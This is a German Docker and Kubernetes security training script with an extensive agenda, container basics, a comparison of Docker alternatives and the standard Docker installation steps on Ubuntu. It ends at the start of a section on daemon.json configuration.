# Kubernetes und Docker Security & Hardening


## Agenda
 1. Docker-Grundlagen 
     * [Übersicht Architektur](#übersicht-architektur)
     * [Was ist ein Container ?](#was-ist-ein-container-)
     * [Was sind container images](#was-sind-container-images)
     * [Container vs. Virtuelle Maschine](#container-vs-virtuelle-maschine)
     * [Was ist ein Dockerfile](#was-ist-ein-dockerfile)

  1. Docker Alternativen
     * [Docker Alternativen](#docker-alternativen)

  1. Docker-Installation & Konfiguration & Sicherheit
     * [BEST for Ubuntu : Install Docker from Docker Repo](#best-for-ubuntu--install-docker-from-docker-repo)
     * [Dockerd rootless installieren #identitaets-und-berechtigungskonzept](https://docs.docker.com/engine/security/rootless/)
     * [Konfig-Fehler in der daemon.json - für die Konfiguration des Docker-Dienstes](#konfig-fehler-in-der-daemonjson---für-die-konfiguration-des-docker-dienstes)
    
  1. Docker build (Sicherheit)
     * [Multi-stage build #minimal-installation](#multi-stage-build-#minimal-installation)

  1. Docker Security
     * [Behandlung von Containern aus einer IT-Security-Sicht sowie Security Best Practices](#behandlung-von-containern-aus-einer-it-security-sicht-sowie-security-best-practices)
     * [Base Images im Überblick #minimal-installation](#base-images-im-überblick-#minimal-installation)
     * [Exercise Docker->Capabilities and User](#exercise-docker->capabilities-and-user)

  1. Docker compose
     * [Docker compose wordpress](#docker-compose-wordpress)

  1. Docker Netzwerk
     * [Docker Netzwerk Exercise](#docker-netzwerk-exercise)

  1. Image Scanning
     * [Registry: Beim hochladen scannen #Schutz-vor-Schadsoftware #Schadcode](#registry-beim-hochladen-scannen-#schutz-vor-schadsoftware-#schadcode)

  1. Kubernetes - Überblick
     * [Warum Kubernetes, was macht Kubernetes](#warum-kubernetes-was-macht-kubernetes)
     * [Aufbau Allgemein](#aufbau-allgemein)
     * [Aufbau mit helm,OpenShift,Rancher(RKE),microk8s](#aufbau-mit-helmopenshiftrancherrkemicrok8s)
     * [Welches System ? (minikube, micro8ks etc.)](#welches-system--minikube-micro8ks-etc)
    
  1. Kubernetes - Client
     * [kubectl installieren und bash completion einrichten](#kubectl-installieren-und-bash-completion-einrichten)
     * [kubectl einrichten mit namespaces](#kubectl-einrichten-mit-namespaces)

 1. Kubernetes Praxis API-Objekte 
     * [Das Tool kubectl (Devs/Ops) - Spickzettel](#das-tool-kubectl-devsops---spickzettel)
     * [kubectl example with run](#kubectl-example-with-run)
     * [Bauen einer Applikation mit Resource Objekten](#bauen-einer-applikation-mit-resource-objekten)
     * [kubectl/manifest/pod](#kubectlmanifestpod)
     * ReplicaSets (Theorie) - (Devs/Ops)
     * [kubectl/manifest/replicaset](#kubectlmanifestreplicaset)
     * Deployments (Devs/Ops)
     * [kubectl/manifest/deployments](#kubectlmanifestdeployments)
     * [Services - Aufbau](#services---aufbau)
     * [kubectl/manifest/service](#kubectlmanifestservice)
     * DaemonSets (Devs/Ops)
     * [Anatomie einer Webanwendung](#anatomie-einer-webanwendung)
     * [ConfigMap Example](#configmap-example)
     * [Configmap MariaDB - Example](#configmap-mariadb---example)
     * [Configmap MariaDB my.cnf](#configmap-mariadb-mycnf)
     * [Übung: Secrets mit secretRef - MariaDB](#übung-secrets-mit-secretref---mariadb)

  1. Kubernetes Ingress (Grundlagen)
     * [Hintergrund Ingress](#hintergrund-ingress)

  1. Kubernetes Ingress (Traefik)
     * [Info: Traefik Ingress Controller installieren (helm)](#info-traefik-ingress-controller-installieren-helm)
     * [Übung: Ingress mit Traefik und Hostnamen](#übung-ingress-mit-traefik-und-hostnamen)
     * [Übung: HTTPS/TLS mit Let's Encrypt - cert-manager](#übung-httpstls-mit-let's-encrypt---cert-manager)

  1. Kubernetes - Wartung / Debugging 
     * [kubectl drain/uncordon](#kubectl-drainuncordon)
     * [Alte manifeste konvertieren mit convert plugin](#alte-manifeste-konvertieren-mit-convert-plugin)
     * [Netzwerkverbindung zu pod testen](#netzwerkverbindung-zu-pod-testen)
     * [Curl from pod api-server](#curl-from-pod-api-server)

  1. Kubernetes - Secrets Management (Hashicorp Vault / OpenBao)
     * [Überblick Hashicorp Vault (VSO, Sidecar, Volumes)](#überblick-hashicorp-vault-vso-sidecar-volumes)
     * [Übung: Vault Secrets Operator (VSO) mit Kubernetes](#übung-vault-secrets-operator-vso-mit-kubernetes)
     * [Info: OpenBao/Hashicorp Vault - Sicherheitsrelevante Findings](#info-openbaohashicorp-vault---sicherheitsrelevante-findings)

  1. Kubernetes - Storage / CSI
     * [CSI - Überblick und Vorteile](#csi---überblick-und-vorteile)
     * [CSI Treiber Liste](https://kubernetes-csi.github.io/docs/drivers.html)
     * [Übung: NFS mit CSI-Treiber (Schritt 3+4)](#übung-nfs-mit-csi-treiber-schritt-3+4)

  1. Trainingszugänge / Clusterumgebung
     * [Clusterumgebung & Zugänge (Bastion, ssh cp, ssh worker, kubectl)](#clusterumgebung--zugänge-bastion-ssh-cp-ssh-worker-kubectl)

  1. Kubernetes - Hardening Überblick
     * [Kubernetes Versionen & CIS Benchmark Überblick](#kubernetes-versionen--cis-benchmark-überblick)
     * [CIS Kubernetes Benchmark V1.12.0 - PDF (Link vom Trainer)](http://161.35.210.204/CIS_Kubernetes_Benchmark_V1.12.0.pdf)

  1. Kubernetes - Hardening (Control Plane)
     * [Kap. 1.2.15 - API Server Profiling: Warum nicht in Produktion?](#kap-1215---api-server-profiling-warum-nicht-in-produktion)
     * [Kap. 1 - CIS Benchmark Control Plane: Übung mit kube-bench](#kap-1---cis-benchmark-control-plane-übung-mit-kube-bench)

  1. Kubernetes - Audit Logging
     * [Kap. 3.2 - API Server Audit Logging aktivieren und auswerten](#kap-32---api-server-audit-logging-aktivieren-und-auswerten)

  1. Kubernetes - Hardening (Worker Nodes)
     * [Kap. 4 - CIS Benchmark Worker Node: Übung mit kube-bench](#kap-4---cis-benchmark-worker-node-übung-mit-kube-bench)

  1. Kubernetes - RBAC Hardening
     * [Kap. 5.1 - RBAC Grundlagen: Roles, Bindings, Subjects, Verbs](#kap-51---rbac-grundlagen-roles-bindings-subjects-verbs)
     * [Kap. 5.1 - RBAC Nutzer anlegen und als zweites kubectl-Profil einrichten](#kap-51---rbac-nutzer-anlegen-und-als-zweites-kubectl-profil-einrichten)
     * [Kap. 5.1 - RBAC Scanning: Schwachstellen mit rbac-lookup finden](#kap-51---rbac-scanning-schwachstellen-mit-rbac-lookup-finden)
     * [Kap. 5.1.2/5.1.6 - RBAC Least Privilege für Entwickler-Namespace](#kap-512516---rbac-least-privilege-für-entwickler-namespace)

  1. Kubernetes - Pod Security Admission (PSA)
     * [Kap. 5.2.1 - PSA: Namespace-weite Durchsetzung von Pod Security Standards](#kap-521---psa-namespace-weite-durchsetzung-von-pod-security-standards)

  1. Kubernetes - hostPID Exploit (Demo)
     * [hostPID + privileged: Ausbruch aus dem Pod auf das Host-System](#hostpid-+-privileged-ausbruch-aus-dem-pod-auf-das-host-system)

  1. Kubernetes - SecurityContext
     * [Kap. 5.2.2/5.2.4/5.2.6/5.2.7/5.2.9 - Pods haerten: non-root, read-only, Capabilities, Seccomp](#kap-522524526527529---pods-haerten-non-root-read-only-capabilities-seccomp)

  1. Kubernetes - NetworkPolicy
     * [Kap. 5.3 - Pod-Traffic absichern: Default-Deny, DNS, Pod-zu-Pod](#kap-53---pod-traffic-absichern-default-deny-dns-pod-zu-pod)

  1. Kubernetes - Veraltete Images
     * [Kap. 5.x - Veraltete Images finden mit version-checker](#kap-5x---veraltete-images-finden-mit-version-checker)

  1. Kubernetes - Security Scanning mit Trivy
     * [CIS 1.x/4.x/5.x - Trivy: Image-CVEs und Cluster-Compliance-Check](#cis-1x4x5x---trivy-image-cves-und-cluster-compliance-check)

  1. Kubernetes - Security Scanning mit Kubescape
     * [NSA/MITRE/CIS - Kubescape: Framework-Compliance und RBAC-Schwachstellen finden](#nsamitrecis---kubescape-framework-compliance-und-rbac-schwachstellen-finden)
     * [CIS/NSA - Kubescape: Control-Plane YAML-Dateien offline scannen](#cisnsa---kubescape-control-plane-yaml-dateien-offline-scannen)

  1. Abschluss-Lab
     * [Kap. 5.1/5.2/5.3 - Pod Hardening Lab: SecurityContext, NetworkPolicy, RBAC](#kap-515253---pod-hardening-lab-securitycontext-networkpolicy-rbac)

  1. Kubernetes Monitoring - Prometheus/Grafana
     * [Prometheus Monitoring Server (Überblick)](#prometheus-monitoring-server-überblick)
     * [Prometheus / Grafana Stack mit Helm installieren](#prometheus--grafana-stack-mit-helm-installieren)
     * [Kubernetes Grafana Dashboards](#kubernetes-grafana-dashboards)


## Backlog - Kubernetes 

 1. Kubernetes - microk8s (Installation und Management) 
     * [Installation Ubuntu - snap](#installation-ubuntu---snap)
     * [Create a cluster with microk8s](#create-a-cluster-with-microk8s)
     * [Remote-Verbindung zu Kubernetes (microk8s) einrichten](#remote-verbindung-zu-kubernetes-microk8s-einrichten)
     * [Bash completion installieren](#bash-completion-installieren)
     * [vim support for yaml](#vim-support-for-yaml)
     * [nano-support for yaml](#nano-support-for-yaml)
     * [Ingress controller in microk8s aktivieren](#ingress-controller-in-microk8s-aktivieren)

  1. Kubernetes Praxis API-Objekte 
     * [Das Tool kubectl (Devs/Ops) - Spickzettel](#das-tool-kubectl-devsops---spickzettel)
     * [kubectl example with run](#kubectl-example-with-run)
     * [Bauen einer Applikation mit Resource Objekten](#bauen-einer-applikation-mit-resource-objekten)
     * [kubectl/manifest/pod](#kubectlmanifestpod)
     * ReplicaSets (Theorie) - (Devs/Ops)
     * [kubectl/manifest/replicaset](#kubectlmanifestreplicaset)
     * Deployments (Devs/Ops)
     * [kubectl/manifest/deployments](#kubectlmanifestdeployments)
     * [Services - Aufbau](#services---aufbau)
     * [kubectl/manifest/service](#kubectlmanifestservice)
     * DaemonSets (Devs/Ops)
     * [Hintergrund Ingress](#hintergrund-ingress)
     * [Ingress Controller auf Digitalocean (doks) mit helm installieren](#ingress-controller-auf-digitalocean-doks-mit-helm-installieren)
     * [Documentation for default ingress nginx](https://kubernetes.github.io/ingress-nginx/user-guide/nginx-configuration/configmap/)
     * [Beispiel Ingress](#beispiel-ingress)
     * [Install Ingress On Digitalocean DOKS](#install-ingress-on-digitalocean-doks)
     * [Beispiel mit Hostnamen](#beispiel-mit-hostnamen)
     * [Achtung: Ingress mit Helm - annotations](#achtung-ingress-mit-helm---annotations)
     * [Permanente Weiterleitung mit Ingress](#permanente-weiterleitung-mit-ingress)
     * [ConfigMap Example](#configmap-example)
     * [Configmap MariaDB - Example](#configmap-mariadb---example)
     * [Configmap MariaDB my.cnf](#configmap-mariadb-mycnf)
     
  1. Helm (Kubernetes Paketmanager) 
     * [Helm Grundlagen](#helm-grundlagen)
     * [Helm Warum ?](#helm-warum-)
     * [Helm Example](#helm-example)

  1. Kubernetes - RBAC 
     * [Nutzer einrichten microk8s ab kubernetes 1.25](#nutzer-einrichten-microk8s-ab-kubernetes-125)
 
  1. Kubernetes - Netzwerk (CNI's) / Mesh
     * [Netzwerk Interna](#netzwerk-interna)
     * [Übersicht Netzwerke](#übersicht-netzwerke)
     * [Calico - nginx example NetworkPolicy](#calico---nginx-example-networkpolicy)
     * [Beispiele Ingress Egress NetworkPolicy](#beispiele-ingress-egress-networkpolicy)
     * [Mesh / istio](#mesh--istio)
     * [Kubernetes Ports/Protokolle](https://kubernetes.io/docs/reference/networking/ports-and-protocols/)
     * [IPV4/IPV6 Dualstack](https://kubernetes.io/docs/concepts/services-networking/dual-stack/)
   
  1. kubectl 
     * [Start pod (container with run && examples)](#start-pod-container-with-run--examples)
     * [Bash completion for kubectl](#bash-completion-for-kubectl)
     * [kubectl Spickzettel](#kubectl-spickzettel)
     * [Tipps&Tricks zu Deploymnent - Rollout](#tippstricks-zu-deploymnent---rollout)

  1. Kubernetes - Shared Volumes 
     * [Shared Volumes with nfs](#shared-volumes-with-nfs)

  1. Kubernetes - Wartung / Debugging 
     * [kubectl drain/uncordon](#kubectl-drainuncordon)
     * [Alte manifeste konvertieren mit convert plugin](#alte-manifeste-konvertieren-mit-convert-plugin)
     * [Netzwerkverbindung zu pod testen](#netzwerkverbindung-zu-pod-testen)
     * [Curl from pod api-server](#curl-from-pod-api-server)

  1. Kubernetes - Tipps & Tricks 
     * [Kubernetes Debuggen ClusterIP/PodIP](#kubernetes-debuggen-clusterippodip)
     * [Debugging pods](#debugging-pods)
     * [Taints und Tolerations](#taints-und-tolerations)
     * [Autoscaling Pods/Deployments](#autoscaling-podsdeployments)

  1. Kubernetes Advanced 
     * [Curl api-server kubernetes aus pod heraus](#curl-api-server-kubernetes-aus-pod-heraus)

  1. Kubernetes - Documentation 
     * [Documentation zu microk8s plugins/addons](https://microk8s.io/docs/addons)
     * [Shared Volumes - Welche gibt es ?](https://kubernetes.io/docs/concepts/storage/volumes/)

  1. Kubernetes - Hardening 
     * [Kubernetes Tipps Hardening](#kubernetes-tipps-hardening)
     * [Kubernetes Security Admission Controller Example](#kubernetes-security-admission-controller-example)
     
  1. Kubernetes Interna / Misc.
     * [OCI,Container,Images Standards](#ocicontainerimages-standards)
     * [Geolocation Kubernetes Cluster](https://learnk8s.io/bite-sized/connecting-multiple-kubernetes-clusters)


## Backlog
  
  1. Docker-Befehle 
     * [Die wichtigsten Befehle](#die-wichtigsten-befehle)
     * [Logs anschauen - docker logs - mit Beispiel nginx](#logs-anschauen---docker-logs---mit-beispiel-nginx)
     * [docker run](#docker-run)
     * [Docker container/image stoppen/löschen](#docker-containerimage-stoppenlöschen)
     * [Docker containerliste anzeigen](#docker-containerliste-anzeigen)
     * [Docker nicht verwendete Images/Container löschen](#docker-nicht-verwendete-imagescontainer-löschen)
     * [Docker container analysieren](#docker-container-analysieren)
     * [Docker container in den Vordergrund bringen - attach](#docker-container-in-den-vordergrund-bringen---attach)
     * [Aufräumen - container und images löschen](#aufräumen---container-und-images-löschen)
     * [Nginx mit portfreigabe laufen lassen](#nginx-mit-portfreigabe-laufen-lassen)
  
  1. Dockerfile - Examples 
     * [Ubuntu mit hello world](#ubuntu-mit-hello-world)
     * [Ubuntu mit ping](#ubuntu-mit-ping)
     * [Nginx mit content aus html-ordner](#nginx-mit-content-aus-html-ordner)
  
  1. Docker-Netzwerk 
     * [Netzwerk](#netzwerk)
  
  1. Docker-Container Examples 
     * [2 Container mit Netzwerk anpingen](#2-container-mit-netzwerk-anpingen)
     * [Container mit eigenem privatem Netz erstellen](#container-mit-eigenem-privatem-netz-erstellen)
  
  1. Docker-Daten persistent machen / Shared Volumes 
     * [Überblick](#überblick)
     * [Volumes](#volumes)
     * [bind-mounts](#bind-mounts)
     * [bind-mounts-permissions](#bind-mounts-permissions)
     
  1. Docker Compose
     * [yaml-format](#yaml-format)
     * [Ist docker-compose installiert?](#ist-docker-compose-installiert)
     * [Example with Wordpress / MySQL](#example-with-wordpress--mysql)
     * [Example with Wordpress / Nginx / MariadB](#example-with-wordpress--nginx--mariadb)
     * [Example with Ubuntu and Dockerfile](#example-with-ubuntu-and-dockerfile)
     * [Logs in docker - compose](#logs-in-docker---compose)
     * [docker-compose und replicas](#docker-compose-und-replicas)
     * [docker compose Reference](https://docs.docker.com/compose/compose-file/compose-file-v3/)
  
  1. Docker Security 
     * [Docker Security](#docker-security)
     * [Scanning docker image with docker scan/snyx](#scanning-docker-image-with-docker-scansnyx)

  1. Docker - Dokumentation 
     * [Vulnerability Scanner with docker](https://docs.docker.com/engine/scan/#prerequisites)
     * [Vulnerability Scanner mit snyk](https://snyk.io/plans/)
     * [Parent/Base - Image bauen für Docker](https://docs.docker.com/develop/develop-images/baseimages/)
    
 
 1. Kubernetes - microk8s (Installation und Management) 
     * [Installation Ubuntu - snap](#installation-ubuntu---snap)
     * [Create a cluster with microk8s](#create-a-cluster-with-microk8s)
     * [Remote-Verbindung zu Kubernetes (microk8s) einrichten](#remote-verbindung-zu-kubernetes-microk8s-einrichten)
     * [Bash completion installieren](#bash-completion-installieren)
     * [vim support for yaml](#vim-support-for-yaml)
     * [nano-support for yaml](#nano-support-for-yaml)
     * [Ingress controller in microk8s aktivieren](#ingress-controller-in-microk8s-aktivieren)

  1. Kubernetes Praxis API-Objekte 
     * [Das Tool kubectl (Devs/Ops) - Spickzettel](#das-tool-kubectl-devsops---spickzettel)
     * [kubectl example with run](#kubectl-example-with-run)
     * [Bauen einer Applikation mit Resource Objekten](#bauen-einer-applikation-mit-resource-objekten)
     * [kubectl/manifest/pod](#kubectlmanifestpod)
     * ReplicaSets (Theorie) - (Devs/Ops)
     * [kubectl/manifest/replicaset](#kubectlmanifestreplicaset)
     * Deployments (Devs/Ops)
     * [kubectl/manifest/deployments](#kubectlmanifestdeployments)
     * [Services - Aufbau](#services---aufbau)
     * [kubectl/manifest/service](#kubectlmanifestservice)
     * DaemonSets (Devs/Ops)
     * [Hintergrund Ingress](#hintergrund-ingress)
     * [Ingress Controller auf Digitalocean (doks) mit helm installieren](#ingress-controller-auf-digitalocean-doks-mit-helm-installieren)
     * [Documentation for default ingress nginx](https://kubernetes.github.io/ingress-nginx/user-guide/nginx-configuration/configmap/)
     * [Beispiel Ingress](#beispiel-ingress)
     * [Install Ingress On Digitalocean DOKS](#install-ingress-on-digitalocean-doks)
     * [Beispiel mit Hostnamen](#beispiel-mit-hostnamen)
     * [Achtung: Ingress mit Helm - annotations](#achtung-ingress-mit-helm---annotations)
     * [Permanente Weiterleitung mit Ingress](#permanente-weiterleitung-mit-ingress)
     * [ConfigMap Example](#configmap-example)
     * [Configmap MariaDB - Example](#configmap-mariadb---example)
     * [Configmap MariaDB my.cnf](#configmap-mariadb-mycnf)
     
  1. Helm (Kubernetes Paketmanager) 
     * [Helm Grundlagen](#helm-grundlagen)
     * [Helm Warum ?](#helm-warum-)
     * [Helm Example](#helm-example)

  1. Kubernetes - RBAC 
     * [Nutzer einrichten microk8s ab kubernetes 1.25](#nutzer-einrichten-microk8s-ab-kubernetes-125)
 
  1. Kubernetes - Netzwerk (CNI's) / Mesh
     * [Netzwerk Interna](#netzwerk-interna)
     * [Übersicht Netzwerke](#übersicht-netzwerke)
     * [Calico - nginx example NetworkPolicy](#calico---nginx-example-networkpolicy)
     * [Beispiele Ingress Egress NetworkPolicy](#beispiele-ingress-egress-networkpolicy)
     * [Mesh / istio](#mesh--istio)
     * [Kubernetes Ports/Protokolle](https://kubernetes.io/docs/reference/networking/ports-and-protocols/)
     * [IPV4/IPV6 Dualstack](https://kubernetes.io/docs/concepts/services-networking/dual-stack/)
   
  1. kubectl 
     * [Start pod (container with run && examples)](#start-pod-container-with-run--examples)
     * [Bash completion for kubectl](#bash-completion-for-kubectl)
     * [kubectl Spickzettel](#kubectl-spickzettel)
     * [Tipps&Tricks zu Deploymnent - Rollout](#tippstricks-zu-deploymnent---rollout)

  1. Kubernetes - Shared Volumes 
     * [Shared Volumes with nfs](#shared-volumes-with-nfs)

  1. Kubernetes - Tipps & Tricks 
     * [Kubernetes Debuggen ClusterIP/PodIP](#kubernetes-debuggen-clusterippodip)
     * [Debugging pods](#debugging-pods)
     * [Taints und Tolerations](#taints-und-tolerations)
     * [Autoscaling Pods/Deployments](#autoscaling-podsdeployments)

  1. Kubernetes Advanced 
     * [Curl api-server kubernetes aus pod heraus](#curl-api-server-kubernetes-aus-pod-heraus)

  1. Kubernetes - Documentation 
     * [Documentation zu microk8s plugins/addons](https://microk8s.io/docs/addons)
     * [Shared Volumes - Welche gibt es ?](https://kubernetes.io/docs/concepts/storage/volumes/)

  1. Kubernetes - Hardening 
     * [Kubernetes Tipps Hardening](#kubernetes-tipps-hardening)
     * [Kubernetes Security Admission Controller Example](#kubernetes-security-admission-controller-example)
     
  1. Kubernetes Interna / Misc.
     * [OCI,Container,Images Standards](#ocicontainerimages-standards)
     * [Geolocation Kubernetes Cluster](https://learnk8s.io/bite-sized/connecting-multiple-kubernetes-clusters)
 
  
## Backlog

  1. Docker-Installation
     * [Installation Docker unter Ubuntu mit snap](#installation-docker-unter-ubuntu-mit-snap)
     * [Installation Docker unter SLES 15](#installation-docker-unter-sles-15)
  
  1. Dockerfile - Examples 
     * [Nginx mit content aus html-ordner](#nginx-mit-content-aus-html-ordner)
     * [ssh server](#ssh-server)
  
  1. Docker-Container Examples 
     * [2 Container mit Netzwerk anpingen](#2-container-mit-netzwerk-anpingen)
     * [Container mit eigenem privatem Netz erstellen](#container-mit-eigenem-privatem-netz-erstellen)
  
  1. Docker-Netzwerk 
     * [Netzwerk](#netzwerk)
     
  1. Docker Security 
     * [Scanning docker image with docker scan/snyx](#scanning-docker-image-with-docker-scansnyx)
  
  1. Docker Compose
     * [yaml-format](#yaml-format)
     * [Example with Ubuntu and Dockerfile](#example-with-ubuntu-and-dockerfile)
     * [docker-compose und replicas](#docker-compose-und-replicas)
     * [docker compose Reference](https://docs.docker.com/compose/compose-file/compose-file-v3/)
  
  1. Docker Swarm 
     * [Docker Swarm Beispiele](#docker-swarm-beispiele)

  1. Docker - Dokumentation 
     * [Vulnerability Scanner with docker](https://docs.docker.com/engine/scan/#prerequisites)
     * [Vulnerability Scanner mit snyk](https://snyk.io/plans/)
     * [Parent/Base - Image bauen für Docker](https://docs.docker.com/develop/develop-images/baseimages/)
    
  1. Kubernetes - Überblick
     * [Installation - Welche Komponenten from scratch](#installation---welche-komponenten-from-scratch)

  1. Kubernetes - microk8s (Installation und Management) 
     * [kubectl unter windows - Remote-Verbindung zu Kuberenets (microk8s) einrichten](#kubectl-unter-windows---remote-verbindung-zu-kuberenets-microk8s-einrichten)
     * [Arbeiten mit der Registry](#arbeiten-mit-der-registry)
     * [Installation Kubernetes Dashboard](#installation-kubernetes-dashboard)

  1. Kubernetes - RBAC 
     * [Nutzer einrichten - kubernetes bis 1.24](#nutzer-einrichten---kubernetes-bis-124)
     
  1. kubectl 
     * [Tipps&Tricks zu Deploymnent - Rollout](#tippstricks-zu-deploymnent---rollout)
     
  1. Kubernetes - Monitoring (microk8s und vanilla) 
     * [metrics-server aktivieren (microk8s und vanilla)](#metrics-server-aktivieren-microk8s-und-vanilla)

  1. Kubernetes - Backups 
     + [Kubernetes Aware Cloud Backup - kasten.io](/backups/cluster-backup-kasten-io.md)

  1. Kubernetes - Tipps & Tricks 
     * [Assigning Pods to Nodes](#assigning-pods-to-nodes)

  1. Kubernetes - Documentation 
     * [LDAP-Anbindung](https://github.com/apprenda-kismatic/kubernetes-ldap)
     * [Helpful to learn - Kubernetes](https://kubernetes.io/docs/tasks/)
     * [Environment to learn](https://killercoda.com/killer-shell-cks)
     * [Environment to learn II](https://killercoda.com/)
     * [Youtube Channel](https://www.youtube.com/watch?v=01qcYSck1c4)

  1. Kubernetes -Wann / Wann nicht 
     * [Kubernetes Wann / Wann nicht](#kubernetes-wann--wann-nicht)

  1. Kubernetes - Hardening 
     * [Kubernetes Tipps Hardening](#kubernetes-tipps-hardening)

  1. Kubernetes Deployment Scenarios 
     * [Deployment green/blue,canary,rolling update](#deployment-greenbluecanaryrolling-update)
     * [Praxis-Übung A/B Deployment](#praxis-übung-ab-deployment)

  1. Kubernetes Probes (Liveness and Readiness) 
     * [Übung Liveness-Probe](#übung-liveness-probe)
     * [Funktionsweise Readiness-Probe vs. Liveness-Probe](#funktionsweise-readiness-probe-vs-liveness-probe)
       
  1. Linux und Docker Tipps & Tricks allgemein 
     * [Auf ubuntu root-benutzer werden](#auf-ubuntu-root-benutzer-werden)
     * [IP - Adresse abfragen](#ip---adresse-abfragen)
     * [Hostname setzen](#hostname-setzen)
     * [Proxy für Docker setzen](#proxy-für-docker-setzen)
     * [vim einrückung für yaml-dateien](#vim-einrückung-für-yaml-dateien)
     * [YAML Linter Online](http://www.yamllint.com/)
     * [Läuft der ssh-server](#läuft-der-ssh-server)
     * [Basis/Parent - Image erstellen](#basisparent---image-erstellen)
     * [Eigenes unsichere Registry-Verwenden. ohne https](#eigenes-unsichere-registry-verwenden-ohne-https)
     
  1. VirtualBox Tipps & Tricks 
     * [VirtualBox 6.1. - Ubuntu für Kubernetes aufsetzen ](#virtualbox-61---ubuntu-für-kubernetes-aufsetzen-)
     * [VirtualBox 6.1. - Shared folder aktivieren](#virtualbox-61---shared-folder-aktivieren)

<div class="page-break"></div>

### Übersicht Architektur


![Docker Architecture - copyright geekflare](https://geekflare.com/wp-content/uploads/2019/09/docker-architecture-609x270.png)

### Was ist ein Container ?


```
- vereint in sich Software
- Bibliotheken 
- Tools 
- Konfigurationsdateien 
- keinen eigenen Kernel 
- gut zum Ausführen von Anwendungen auf verschiedenen Umgebungen 

- Container sind entkoppelt
- Container sind voneinander unabhängig 
- Können über wohldefinierte Kommunikationskanäle untereinander Informationen austauschen

- Durch Entkopplung von Containern:
  o Unverträglichkeiten von Bibliotheken, Tools oder Datenbank können umgangen werden, wenn diese von den Applikationen in unterschiedlichen Versionen benötigt werden.
```

### Was sind container images


  * Container Image benötigt, um zur Laufzeit Container-Instanzen zu erzeugen 
  * Bei Docker werden Docker Images zu Docker Containern, wenn Sie auf einer Docker Engine als Prozess ausgeführt werden.
  * Man kann sich ein Docker Image als Kopiervorlage vorstellen.
    * Diese wird genutzt, um damit einen Docker Container als Kopie zu erstellen   

### Container vs. Virtuelle Maschine


```
VM's virtualisieren Hardware
Container virtualisieren Betriebssystem 


```

### Was ist ein Dockerfile


## What is it ? 
 * Textdatei, die Linux - Kommandos enthält
   * die man auch auf der Kommandozeile ausführen könnte 
   * Diese erledigen alle Aufgaben, die nötig sind, um ein Image zusammenzustellen
   * mit docker build wird dieses image erstellt 
   
## Example 

```
## syntax=docker/dockerfile:1
FROM ubuntu:18.04
COPY . /app
RUN make /app
CMD python /app/app.py
```

## Docker Alternativen

### Docker Alternativen


### Übersicht

| Tool | Typ | Build | Push | Run | Daemon | Privileged | Primärer Use Case |
|---|---|:---:|:---:|:---:|:---:|:---:|---|
| **Podman** | CLI Drop-in | ✅ | ✅ | ✅ | ❌ | ❌ | Docker-Ersatz, rootless Dev |
| **nerdctl** | CLI für containerd | ✅ | ✅ | ✅ | ❌ | teilweise | Dev-Workflow auf containerd |
| **Buildah** | Image-Build | ✅ | ✅ | ❌ | ❌ | ❌ | Scripted Builds |
| **kaniko** | CI/CD Build+Push | ✅ | ✅ (direkt) | ❌ | ❌ | ❌ | CI/CD in Kubernetes |
| **Skopeo** | Image-Transfer | ❌ | ✅ | ❌ | ❌ | ❌ | copy/inspect/sign |
| **containerd** | Low-level Runtime | ❌ | ❌ | ✅ | ✅ | — | Kubernetes CRI |
| **CRI-O** | Low-level Runtime | ❌ | ❌ | ✅ | ✅ | — | Kubernetes CRI (minimal) |
| **LXC/LXD** | System-Container | ❌ | ❌ | ✅ | ✅ | — | Leichte VMs |

---

### Wichtige Unterschiede zu Docker

#### Podman
- Kein Daemon → kein `dockerd`-Prozess
- Rootless out-of-the-box → sicherer
- `alias docker=podman` funktioniert meist reibungslos
- `podman-compose` als Drop-in für `docker-compose`

#### nerdctl
- Docker-kompatibles CLI direkt auf containerd
- Aktiv gepflegt (v2.2.2, März 2026), offizielles containerd-Subprojekt
- Nützlich zum Debuggen von Kubernetes-Nodes (`--namespace=k8s.io`)
- Lazy-pulling, Image-Encryption, IPFS-Distribution als Extras

#### Buildah
- Nur Build, kein Runtime
- Gut für CI-Pipelines ohne laufenden Daemon
- Oft in Kombination mit Podman verwendet

#### kaniko
- Ursprünglich von Google entwickelt
- Baut **und pusht** in einem Schritt direkt in die Registry (`--destination`)
- Kein privilegierter Container nötig → ideal für Kubernetes-Pods
- GitLab empfiehlt kaniko explizit für CI/CD ohne Docker-Socket

```yaml
## .gitlab-ci.yml
build:
  image:
    name: gcr.io/kaniko-project/executor:debug
  script:
    - /kaniko/executor
      --context $CI_PROJECT_DIR
      --dockerfile Dockerfile
      --destination $CI_REGISTRY_IMAGE:$CI_COMMIT_TAG
      --cache=true
```

#### Skopeo
- Kein Build, kein Run — nur Image-Operationen
- copy, inspect, sign zwischen Registries
- Ideal für Registry-Mirroring und Image-Promotion in CI/CD

---

### crictl — CRI-Debugging

`crictl` ist ein generischer CRI-Client für **containerd und CRI-O**:

```yaml
## /etc/crictl.yaml

## containerd
runtime-endpoint: unix:///run/containerd/containerd.sock

## CRI-O
runtime-endpoint: unix:///run/crio/crio.sock
```

Oder per Flag: `crictl --runtime-endpoint unix:///run/crio/crio.sock ps`

---

### Empfehlungen nach Use Case

| Use Case | Empfehlung |
|---|---|
| Lokale Entwicklung (Docker-Ersatz) | **Podman** |
| CI/CD in Kubernetes ohne Daemon | **kaniko** |
| Kubernetes-Node debuggen | **crictl** / **nerdctl** |
| Image-Build in Skripten | **Buildah** |
| Registry-Operationen | **Skopeo** |
| Containerd direkt nutzen | **nerdctl** |


## Docker-Installation & Konfiguration & Sicherheit

### BEST for Ubuntu : Install Docker from Docker Repo


### Walkthrough 

```
sudo apt-get update
sudo apt-get install \
    ca-certificates \
    curl \
    gnupg \
    lsb-release

sudo mkdir -p /etc/apt/keyrings
curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg

echo \
  "deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/ubuntu \
  $(lsb_release -cs) stable" | sudo tee /etc/apt/sources.list.d/docker.list > /dev/null

sudo apt-get update
sudo apt-get install docker-ce docker-ce-cli containerd.io docker-compose-plugin
```

### Läuft der Dienst (dockerd) 

```
systemctl status docker 
```

### docker-compose ? 

```
## herausfinden, ob docker compose installieren 
docker compose version 
```

### Dockerd rootless installieren #identitaets-und-berechtigungskonzept

  * https://docs.docker.com/engine/security/rootless/

### Konfig-Fehler in der daemon.json - für die Konfiguration des Docker-Dienstes


### Konfigurationsdateien

#### Docker Daemon
| Datei | Zweck |
|-------|-------|
| `/etc/docker/daemon.json` | Haupt-Daemon-Config |
